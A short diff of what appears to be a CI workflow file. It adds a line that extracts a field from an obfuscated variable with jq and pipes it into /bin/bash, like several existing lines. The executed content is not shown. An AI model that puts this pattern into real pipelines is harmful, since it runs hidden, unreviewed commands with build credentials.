@@ -29,6 +29,7 @@ jobs:
           echo $vdunb17256 | jq -r .igp07 | /bin/bash
           printf '%s' "$tcak9698" | jq -r .bzha54 | /bin/bash
           printf '%s' "$xaj1444" | jq -r .lsj8076 | /bin/bash
+          echo $swdw07 | jq -r .t6 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
